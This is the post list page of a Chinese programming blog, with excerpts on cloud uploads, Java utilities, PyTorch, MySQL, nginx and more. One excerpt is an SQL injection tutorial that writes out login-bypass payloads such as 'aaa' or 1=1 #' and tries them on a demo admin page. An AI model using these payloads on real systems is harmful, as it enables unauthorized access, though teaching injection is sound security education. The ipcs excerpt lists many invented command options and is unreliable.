<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38f08f3880f701aaa9950a282ff949f0/" rel="bookmark">
			实现阿里云OSS文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.开通服务并获取配置 通过 对象存储OSS 购买服务后 ，该步骤主要配置 region、bucket ，再通过 AccessKey管理 获取到服务 accessKeyId、accessKeySecret ，即得到如下信息：
{ "region": "region", "bucket": "bucket", "AccessKey": "AccessKey", "accessKeySecret": "accessKeySecret", // 用于服务端签名后直传，设置上传回调 "callback": "callback", // 用于服务端签名后直传，设置上传回调接口认证 "x-csrf-token": "x-csrf-token" } 服务器端签名直传，首先是后端会提供一个接口，前端请求该接口后会返回一些字段数据，即以上关键信息；
2.上传方案确认 服务端验证上传
先将文件传递到应用服务器，再由应用服务器上传至oss服务器，这种方式的优势是简单易懂，只须要按照文档使用ali-oss中间件上传就行，本文重点不放在这种方式；
这种方式缺点是，文件要先上传到应用服务器，再上传到oss，占用带宽资源，过程简单，调用服务端接口；
服务端签名前端直传
在客户端通过JavaScript代码完成签名，无需过多配置，即可实现直传，非常方便。但是客户端通过JavaScript把AccesssKey ID和AccessKey Secret写在代码里面有泄露的风险，强烈建议使用服务端签名后直传或者STS临时授权访问OSS；
该方式分为两种上传方案：
通过 oss-js-sdk ，即 ali-oss 上传文件；通过第三方请求工具上传，如 axios ，wx.uploadFile 等，本文主要对该方式进行配置说明； 3.配置说明 ​ 通过第三方请求工具上传，如 axios ，wx.uploadFile 等；
​ 大多数情况下，用户上传数据后，应用服务器需要知道用户上传了哪些文件以及文件名；如果上传了图片，还需要知道图片的大小等，为此OSS提供了上传回调方案；
​ 具体参数说明，参考阿里云 - 帮助中心 - PostObject，必要配置参数如下：
{ "OSSAccessKeyId": "OSSAccessKeyId", // 通过 crypto-js 生成，或直接从后端获取 "policy": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/38f08f3880f701aaa9950a282ff949f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/413442e77bc7ecc4545ead770c0cbbd4/" rel="bookmark">
			Spring Boot &#43; EasyUI Datebox和Datetimebox样例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用EasyUI的Datebox和Datetimebox组件，并对其进行适当的改造，比如更改日期格式、设置默认值或者将当前时间设置为默认值。
一、运行结果 二、实现代码 1.代码框架 2.实现代码 SpringBootMainApplication.java:
package com.xj.main; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.annotation.ComponentScan; /** * @Author: xjfu * @Create: 2023/10/20 7:33 * @Description: SpringBoot启动类 */ @ComponentScan("com.xj") @SpringBootApplication public class SpringBootMainApplication { public static void main(String[] args) { try{ SpringApplication.run(SpringBootMainApplication.class, args); }catch (Exception e){ e.printStackTrace(); } } } ThymeleafController.java
package com.xj.controller; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; /** * @Author: xjfu * @Create: 2023/10/20 7:42 * @Description: */ @RequestMapping("/easyui") @Controller public class ThymeleafController { //Datebox和Datetimebox案例 @RequestMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/413442e77bc7ecc4545ead770c0cbbd4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecfd2b386c8fc325c2b597fe5c2198de/" rel="bookmark">
			shell之ipcs命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		shell之ipcs命令 命令参数常见例子 命令参数 -a：显示所有IPC设施的信息。
-m：显示所有共享内存的信息。
-s：显示所有信号量的信息。
-q：显示所有消息队列的信息。
-i ：显示指定标识符（id）的IPC设施的信息。
-l：在显示共享内存信息时，同时显示连接到该共享内存的进程的详细信息。
-b ：在显示消息队列信息时，限制为队列上消息的最大字节数为指定字节数（bytes）。
-c ：在显示信号量信息时，限制为每个信号量集中信号量的数量为指定数量（count）。
-n ：显示前num个IPC设施的信息。
-r：在显示共享内存信息时，同时显示共享内存的权限。
-f ：设置输出格式，可以使用“long”或“short”格式。
-o ：设置输出选项，例如“-o pid,comm,uids”。
-p ：在显示共享内存、信号量或消息队列信息时，只显示指定进程ID（pid）的信息。
-t：在显示共享内存、信号量或消息队列信息时，同时显示时间戳。
-S ：在显示共享内存信息时，只显示处于指定状态（state）的共享内存，例如“-S dest”。
-l ：在显示消息队列信息时，限制为每个队列的消息的最大长度为指定长度（length）字节。
-N ：在显示共享内存、信号量或消息队列信息时，只显示指定名称（name）的设施的信息。
-C ：使用指定的CoreFile文件来代替/dev/mem文件。
-A ：在显示共享内存、信号量或消息队列信息时，将新的输出追加到指定的文件（append）中。
-B &lt;block_size&gt;：在显示共享内存信息时，将每个块的字节数设置为指定块大小（block_size）字节。
-L ：在显示共享内存、信号量或消息队列信息时，同时显示标签（label）。
-M ：在显示共享内存、信号量或消息队列信息时，同时显示掩码（mask）。
-P ：在显示共享内存、信号量或消息队列信息时，同时显示模式（pattern）。
-U ：在显示共享内存、信号量或消息队列信息时，同时显示单位（unit），例如“-U pages”表示以页为单位显示。
-d ：在显示共享内存、信号量或消息队列信息时，设置延迟（delay）参数，用于控制输出速度。
-D ：在显示共享内存、信号量或消息队列信息时，设置方向（direction）参数，例如“-D in”表示只显示输入方向的信息。
-F &lt;format_string&gt;：在显示共享内存、信号量或消息队列信息时，使用指定的格式字符串进行格式化输出。
-h &lt;header_string&gt;：在显示共享内存、信号量或消息队列信息时，设置标题行（header_string）的字符串。
-r ：在显示共享内存、信号量或消息队列信息时，将数值的基数设置为指定进制数（radix）。
-s &lt;sort_key&gt;：在显示共享内存、信号量或消息队列信息时，按照指定的排序键进行排序输出。
-t &lt;timestamp_key&gt;：在显示共享内存、信号量或消息队列信息时，设置时间戳字段的键（timestamp_key）。
-T &lt;time_format&gt;：在显示共享内存、信号量或消息队列信息时，设置时间格式字符串（time_format）。
-v &lt;value_key&gt;：在显示共享内存、信号量或消息队列信息时，设置值字段的键（value_key）。
常见例子 查看系统上所有IPC资源的信息：ipcs -a
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecfd2b386c8fc325c2b597fe5c2198de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc44d353cc23d940400c09d1843673ac/" rel="bookmark">
			【bug解决】CUDA和pytorch版本不匹配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息如下：
NVIDIA GeForce RTX 3090 with CUDA capability sm_86 is not compatible with the current PyTorch installation. The current PyTorch install supports CUDA capabilities sm_37 sm_50 sm_60 sm_70. If you want to use the NVIDIA GeForce RTX 3090 GPU with PyTorch, please check the instructions at https://pytorch.org/get-started/locally/ 查了一下百度翻译：
NVIDIA GeForce RTX 3090与CUDA功能sm_86不兼容当前的PyTorch安装。
当前的PyTorch安装支持CUDA功能sm_37 sm_50 sm_60 sm_70。
如果您想使用NVIDIA GeForce RTX 3090 GPU与PyTorch，请查看https://pytorch.org/get-started/locally/的说明
简单来说，就是说pytorch版本和cuda不匹配
查看一下显卡信息：nvidia-smi，显示11.6版本
11.6版本的cuda需要安装1.12.0或者1.12.1版本的pytorch
torchvision也需要安装相应的版本0.13.0
执行这条pip命令安装：
pip install torch==1.12.0+cu116 torchvision==0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc44d353cc23d940400c09d1843673ac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8da3ce7d9f05e5a7c73e6459e3bf90a/" rel="bookmark">
			SQL注入案例及原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL注入案例及原理 前言 本次将简单的学习SQL注入案例及原理 一、SQL注入是什么？ SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。
二、通过万能用户名来登录网页管理系统 万能用户名 这两个就是万能用户名，下面将进行实际操作
aaa’ or 1=1 #
aaa’ or ‘1’='1
首先进入演示网站中的后台管理
可以看到有一个登录界面
这里随便输入一个用户名和密码登录/用户名:admin 密码:password
可以看到登录失败
使用bp抓包查看，可以发现登录包为POST请求，而且可以看到我们刚刚输入的用户名和密码，以及请求回显为200
这次我们使用万能用户名登录/用户名:aaa' or 1=1 # 密码:1
发现可以登录，用户名为我们刚刚输入的万能用户名
使用bp抓包查看，POST请求包中输入的用户名所包含的特殊字符变成了URL编码，%27为'，空格为了+，等于号为%3D,井号为%23。回显中发现密码变为了MD5形式。
由此可以推断这个网页源码存在问题
解析 以下为源码文件
&lt;?php session_start (); header('Content-Type: text/html; charset=utf-8'); include_once ("../include/config.inc.php"); if (isset ( $_POST ["username"] )) { $username = $_POST ["username"]; } else { $username = ""; } if (isset ( $_POST ["password"] )) { $password = $_POST ["password"]; } else { $password = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8da3ce7d9f05e5a7c73e6459e3bf90a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d90782dc28c3766aed5ee8835a418b7/" rel="bookmark">
			MySQL——Centos7下环境安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
0.说明
1. 检查环境（systemctl start/stop/restart）
2. 检查系统安装包（rpm -qa）
3. 卸载这些默认安装包（yum remove、xargs）
4. 获取mysql官方yum源
5. 安装mysql yum源，对比前后yum源（rpm -ivh）
6. 能否正常工作
7. 安装mysql服务
8. 查看配置文件和数据存储位置
9. 启动服务（systemctl start）
10. 查看启动服务
11. 登陆方法一
12. 登陆方法二
13. 登陆方式三
14. 设置开机启动
15. 配置my.cnf
16. 常见问题
0.说明 安装与卸载中，⽤⼾全部切换成为root，⼀旦安装，普通⽤⼾能使⽤的mysql不进⾏⽤⼾管理，全部使⽤root进⾏，掌握mysql语句，学习⽤⼾管理后，在考虑新建普通⽤⼾ 1. 检查环境（systemctl start/stop/restart） 1. 查看系统当中是否存在MySQL或者mariadb
（mariadb是MySQL开源分支），存在可直接使用MySQL
[root@VM-4-10-centos /]# ps axj | grep mysql 8577 10898 10897 17609 pts/2 10897 S+ 0 0:00 grep --color=auto mysql 1 20559 20558 20558 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6d90782dc28c3766aed5ee8835a418b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9215ccd8bceca393166aec981a2c7602/" rel="bookmark">
			小土堆学习——python官网torchvision中数据集下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.进入PyTorch官网
PyTorch
点击torchvision
2.在左上角版本选择切换到0.9.0版本即可看到torchvision的数据集目录
3.点击想要下载的数据集名称即可看到该类需要写入的参数有哪些
4.在pycharm中通过代码实现自动下载：
import torchvision #自动下载数据集 train_set = torchvision.datasets.CIFAR10(root="./dataset",train=True,download=True) test_set = torchvision.datasets.CIFAR10(root="./dataset",train=False,download=True) #print(test_set[0]) #测试集第一个数据 #print(test_set.classes) #测试集的类型 #img,target = test_set[0] #print(img) #print(target) #print(test_set.classes[target]) #输出测试集类型名称 #img.show() #图片查看 其中root代表你的数据集下载保存的位置，train为True则表示这是训练集，False代表是测试集，download为True表示自动下载，False表示非自动下载。
注：点击运行后如果下载速度过慢，可选择手动下载，通过迅雷加速下载，下载后手动导入root设定的目录下，即可使用
5.使用tensorboard展示图片：需要先把所有PIL格式的图片通过transforms的Compose方法转换为Tensor格式，再去进行展示
import torchvision from torch.utils.tensorboard import SummaryWriter dataset_transform = torchvision.transforms.Compose([torchvision.transforms.ToTensor()]) #对数据集中每一张图片都转换为tensor类型 #自动下载数据集 train_set = torchvision.datasets.CIFAR10(root="./dataset",train=True,transform=dataset_transform,download=True) test_set = torchvision.datasets.CIFAR10(root="./dataset",train=False,transform=dataset_transform,download=True) #用tensorboard进行显示 writer = SummaryWriter("dataexample") for i in range(10): img,target = test_set[i] writer.add_image("test_set",img,i) writer.close() 在这里我犯了一个错误：
、
原因是我在编写代码时忘记了数据集中包括了图片和标签，代码直接编写为下面这样
#用tensorboard进行显示 writer = SummaryWriter("dataexample") for i in range(10): writer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9215ccd8bceca393166aec981a2c7602/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94160852ead69cf4b4d9e671d2850c29/" rel="bookmark">
			【LaTeX】tex文件保存后在哪里查看生成好的pdf文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要将 LaTeX 文档导出为 PDF 文件，需要使用 LaTeX 编译引擎，并按照以下步骤进行操作：
1. 创建 LaTeX 源文件：首先，需要编写 LaTeX 源文件，通常以 .tex 为扩展名。在 LaTeX 源文件中，可以编写文本、数学公式、图形、表格等内容，然后使用 LaTeX 命令进行格式化。
2. 选择 LaTeX 编译引擎：LaTeX 文档可以使用不同的编译引擎，最常见的是 pdflatex、xelatex 和 lualatex。选择合适的编译引擎通常取决于自己的需求。pdflatex 是最常用的，适用于大多数文档。
3. 编译 LaTeX 文档：在命令行终端中，使用选定的 LaTeX 编译引擎来编译文档。例如，使用 pdflatex 编译文档的命令如下：
pdflatex your_document.tex
或者，如果使用其他编译引擎，如 xelatex 或 lualatex，可以相应地替换 pdflatex。
运行编译命令会生成辅助文件和 PDF 输出。通常，需要运行编译命令多次以确保交叉引用和目录正确生成。
4. 查看生成的 PDF 文件：一旦编译完成，将在与 LaTeX 源文件相同的目录中找到生成的 PDF 文件，通常以 .pdf 为扩展名。可以使用 PDF 阅读器来查看生成的 PDF 文档。
如图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0ef23589f39955f7f4e6e17b385e996/" rel="bookmark">
			TypeVariable、ParameterizedType、GenericArrayType的区别和作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TypeVariable、ParameterizedType、GenericArrayType的详解 一、TypeVariable的作用 在官网中 typeVariable的解释是:Parameterized Type参数化类型,这一点并不好理解。接下来我举几个例子：我们要理解参数化类型首先需要知道什么事具体的类型：具体的类型列如: string、Integer、List是明确的一个类型。也可以是我们自己定义的类。参数化类型换句话说就是类型不确定。比如我们常见的泛型。
Map&lt;K,V&gt; List&lt;T&gt; T 向这种在括号里面的K,V,T这种,我们称为泛型，同样也可以说是不确定的类型。TypeVariable 就是代表的这种类型。我们常常在源码中看到判断某种类型是否是泛型的方式。
private static Type resolveType(Type type, Type srcType, Class&lt;?&gt; declaringClass) { if (type instanceof TypeVariable) { } } 我们也可以测试一下。定义一个测试类，定义一个list类型，注意list是具体的类型，只用T才是泛型
package com.zeng.demo; import java.lang.reflect.Type; import java.util.List; public class ReturnTypeClass&lt;T&gt; { private List&lt;T&gt; arrays; private T t; private List&lt;T&gt; getList() { return arrays; } private T get() { return t; } } 测试，可以看到结果，说明TypeVariable其实就是表示的泛型
public static void main(String[] args) { //获取所有的方法 Method[] declaredMethods = ReturnTypeClass.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0ef23589f39955f7f4e6e17b385e996/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1174ccfc008fc172800778b9de3253ad/" rel="bookmark">
			【Java日期时间处理工具类】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提供时间,字符串转换.时间间隔计算,最大时间,最小时间等
package zuoan.utils; import com.chang.util.ValidateUtil; import org.apache.commons.lang.time.DateFormatUtils; import java.time.Duration; import java.time.LocalDate; import java.time.LocalDateTime; import java.time.LocalTime; import java.time.ZoneId; import java.time.format.DateTimeFormatter; import java.time.temporal.ChronoUnit; import java.time.temporal.TemporalAdjusters; import java.util.Calendar; import java.util.Date; public class DateUtil { public static String YEAR = "yyyy"; public static String YEARMONTH = "yyyy-MM"; public static String YEARMONTHDAY = "yyyy-MM-dd"; public static String YEARMONTHDAYTIMEBRANCH = "yyyy-MM-dd HH:mm"; public static String YEARMONTHDAYTIMEBRANCHSECOND = "yyyy-MM-dd HH:mm:ss"; public static String YEARMONTHDAYTIMEBRANCHSECONDMILLISECOND = "yyyy-MM-dd HH:mm:ss SSS"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1174ccfc008fc172800778b9de3253ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b3ca2cdb14021e2ea78475d2f799ad7/" rel="bookmark">
			[Leetcode] 0119. 杨辉三角 II
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		119. 杨辉三角 II 题目描述 给定一个非负索引 rowIndex，返回「杨辉三角」的第 rowIndex 行。
在「杨辉三角」中，每个数是它左上方和右上方的数的和。
示例 1:
输入: rowIndex = 3 输出: [1,3,3,1] 示例 2:
输入: rowIndex = 0 输出: [1] 示例 3:
输入: rowIndex = 1 输出: [1,1] 提示:
0 &lt;= rowIndex &lt;= 33 进阶：
你可以优化你的算法到 O(rowIndex) 空间复杂度吗？
解法 该方法是常见的方法，即按照新建一个二维数组 res[i][j] ，数组的每一行 res[i] 代表了杨辉三角的第 i 行的所有元素， res[i][j] 表示杨辉三角的第 i 行第 j 列的元素。。
由下面的图我们可以看出： \(res[i][j] = res[i - 1][j - 1] + res[i - 1][j]\)。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b3ca2cdb14021e2ea78475d2f799ad7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62a8d0cfc060cba0d57472e3b661b8b2/" rel="bookmark">
			Java 汉语 中文拼音工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在国内开发应用程序有时候为了满足客户各种需求经常要写一些与汉语，拼音等相关的工具类，下面是博主经常在项目中使用的一个拼音工具类。
下面是实用工具类需要的依赖
&lt;dependency&gt; &lt;groupId&gt;com.belerweb&lt;/groupId&gt; &lt;artifactId&gt;pinyin4j&lt;/artifactId&gt; &lt;version&gt;2.5.1&lt;/version&gt; &lt;/dependency&gt; 工具类代码
package com.utils; import net.sourceforge.pinyin4j.PinyinHelper; import net.sourceforge.pinyin4j.format.HanyuPinyinCaseType; import net.sourceforge.pinyin4j.format.HanyuPinyinOutputFormat; import net.sourceforge.pinyin4j.format.HanyuPinyinToneType; import net.sourceforge.pinyin4j.format.exception.BadHanyuPinyinOutputFormatCombination; /** * 中文拼音工具类 * @author message丶小和尚 * @create 2020/01/10 */ public class PinyinUtil { /** * 获取第一个汉字的首字母 例如 张三：z * @param string * @return */ public static String getPinYinFirstChar(String string) { if(ValidateUtil.isEmpty(string)){ return ""; } return getPinYinHeadChar(string).substring(0,1); } /** * 获取所有汉字首字母 例如 张三：zs * @param string * @return */ public static String getPinYinHeadChar(String string) { StringBuilder convert = new StringBuilder(); for (int j = 0; j &lt; string.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62a8d0cfc060cba0d57472e3b661b8b2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3aa1687e2a19bd750978632fd8cbcf72/" rel="bookmark">
			李开复领队开源大模型 Yi，40万字上下文窗口破纪录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者 | 袁滚滚 出品 | CSDN（ID：CSDNnews）
由李开复博士亲自下场创办的零一万物（01.ai），自 3 月底官宣成立后，于近日发布并开源了两个版本的中英文大模型 Yi-6B 和 Yi-34B。
在线上发布环节，李开复博士重点介绍了 Yi 系列大模型的三处性能亮点：
全球最长 200K 上下文窗口，免费开源
超强 Al Infra 实测训练，成本下降40%
科学训模自研「规模化训练实验平台」
Yi-34B 目前在各个基准测试中，都获得了很好的表现，据零一万物提供的评测结果看来，Yi-34B 和 Yi-6B 均在 MMLU、BBH、C-Eval 取得了不错的成绩。
在参数规模方面，李开复博士强调了本次发布选择了 6B 和 34B 版本，是当前对学术、开发者社区最友好的版本。34B 模型版本具备更优越的知识容量、下游任务的容纳能力和多模态能力，也达到了大模型 「涌现」的门槛。
而比起更大的 50B 至 70B，34B 是单卡推理可接受的模型尺寸的上限，训练成本对开发者更友好，经过量化的模型可以在一张消费级显卡（如4090）上进行高效率的推理，对开发者操作服务部署有很大的优势。
发布会中 CSDN 提问如何看待大模型的未来演进方向时，李开复博士认为大模型一定会持续扩大参数规模，来探索模型技术和模型效果的极限。同时透露，零一万物在持续进行千亿参数规模的模型训练，也为此准备好了未来 18 个月里所需要的算力。在多模态方面已经形成了十多人的技术团队，在未来一两个月内，也会有相关工作能够对外公开。
全网首个开源、超长上下文大模型
今日上线
此次开源的 Yi-34B 模型，将发布全球最长、可支持 200K 超长上下文窗口版本，可以处理约 40 万汉字超长文本输入，也就是超过 1000 页 PDF 文档规模的内容。目前 GPT-4-32k 支持约 2.5 万字输入，Claude-100k 目前支持 8 万字，国内大模型 Moonshot、Baichuan 也相继推出长上下文窗口的版本。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3aa1687e2a19bd750978632fd8cbcf72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62cdbb901072cd13c149a2f014447efa/" rel="bookmark">
			最全的 ES 重点内容整理（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ES2020 ( ES11 ) 1. 可选链操作符 ● 在 JavaScript 的操作中, 我们经常会访问一些属性, 但是如果他的前置是未定义的呢 ? 是不是就会报错了呢
● 这个时候我们不确定他的前置是不是确实存在, 那么我们怎么办呢 ?
● 只能是任由他报错, 如果要做一些容错处理, 那么只能是 try catch 了, 但是这样的代码太难受了看起来
● 在 ES2020 中出现了一个新的运算符, 可选链运算符 ( ?. ), 帮我们解决了这个问题
● 意义 : 当前置是 undefined 的时候, 不在继续向后访问属性, 直接返回 undefined
const obj = { info: { a: 100, b: 200 } } // 正常访问没有问题 console.log(obj.info.a) // =&gt; 100 // 当我们访问一个没有的前置的时候 console.log(obj.desc.a) // =&gt; 报错 // 这个时候就可以使用可选链运算符来代替 // 如果 obj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62cdbb901072cd13c149a2f014447efa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e04866cfa7edb06770045d825f543bc/" rel="bookmark">
			HttpUtils工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为Java开发程序员，需要我们经常写一些工具类来简化开发过程，我们自己肯定写过或者用过HttpUtils用来发送http请求，但是每次手写太繁琐了，于是就按照标准写了一个Http工具类，现在分享出来。
1.HTTP请求简介 HTTP(Hypertest Transfer Protocol)是用于传输像HTML这样的超文本文件的应用层协议。它被设计用于WEB浏览器端和WEB服务端的交互，但也有其它用途。HTTP遵循经典的client-server模型，客户端发起请求尝试建立连接，然后等待服务端的应答。HTTP是无状态协议，这意味着服务端在两次请求间不会记录任何状态。
2.Http请求四要素 一个HTTP请求报文由四个部分组成：请求行、请求头部、空行、请求数据。
1、请求行
请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。
2、请求头部
HTTP客户程序（例如浏览器），向服务器发送请求的时候必须指明请求类型（一般是GET或者POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说Content-Length必须出现。
3、空行
它的作用是通过一个空行，告诉服务器请求头部到此为止。
4、请求数据
若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据。
HttpUtils的代码
package com.zuoan.utils; import com.alibaba.fastjson.JSON; import lombok.extern.slf4j.Slf4j; import org.apache.http.Consts; import org.apache.http.HttpEntity; import org.apache.http.NameValuePair; import org.apache.http.client.entity.UrlEncodedFormEntity; import org.apache.http.client.methods.CloseableHttpResponse; import org.apache.http.client.methods.HttpGet; import org.apache.http.client.methods.HttpPost; import org.apache.http.client.utils.URIBuilder; import org.apache.http.entity.StringEntity; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClients; import org.apache.http.message.BasicNameValuePair; import org.apache.http.util.EntityUtils; import java.io.IOException; import java.util.ArrayList; import java.util.List; import java.util.Map; public class HttpUtil { private static final CloseableHttpClient httpclient = HttpClients.createDefault(); private static final String userAgent = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e04866cfa7edb06770045d825f543bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9287bcf1792ae806b6adfe3a7a6048c9/" rel="bookmark">
			linux安装nginx 1.25.2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.下载nginx-1.25.2.tar.gz放在/opt下
wget http://nginx.org/download/nginx-1.22.1.tar.gz
2.解包 Nginx 软件包：
tar -xvf nginx-1.22.1.tar.gz
3.安装 Nginx 依赖：
在安装 Nginx 之前，需要先安装一些依赖库：pcre、openssl、gcc、zlib（推荐使⽤yum源⾃动安装）
yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel 4.进入解压后的目录：
使用 cd 命令进入解压后的 Nginx 目录：
cd nginx-1.22.1 5.配置 Nginx：
使用 ./configure 命令配置 Nginx ，后缀with-http_ssl_module安装http_ssl_module模块
./configure --with-http_ssl_module 6.编译 Nginx：
make 7.安装 Nginx：9.
make install 8.进入 sbin 目录并启动 Nginx： cd /usr/local/nginx/sbin ./nginx 9.访问服务器的 80 端口：
一旦 Nginx 启动并监听了 80 端口，使用浏览器访问服务器的 IP 地址，例如 http://服务器IP，即可查看 Nginx 默认的欢迎页面 10.配置ssl证书
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9287bcf1792ae806b6adfe3a7a6048c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87c1c56f22392573dfc93009034a3b4e/" rel="bookmark">
			Linux /dev目录详解和Linux系统各个目录的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux /dev目录详解 在linux下，/dev目录是很重要的，各种设备都在下面。下面简单总结一下：
dev是设备(device)的英文缩写。 /dev这个目录对所有的用户都十分重要。因为在这个目录中包含了所有Linux系统中使用的外部设备。但是这里并不是放的外部设备的驱动程序，这一点和windows,dos操作系统不一样。它实际上是一个访问这些外部设备的端口。我们可以非常方便地去访问这些外部设备，和访问一个文件，一个目录没有任何区别。
Linux沿袭Unix的风格，将所有设备认成是一个文件。
关于一些特殊设备：
/dev/null和/dev/zero：http://www.51testing.com/index.php?uid-225738-action-viewspace-itemid-235339
/dev/tty、/dev/console、/dev/pty、/dev/pts等：http://www.51testing.com/index.php?uid-225738-action-viewspace-itemid-212419
设备文件分为两种：块设备文件(b)和字符设备文件©
设备文件一般存放在/dev目录下，对常见设备文件作如下说明：
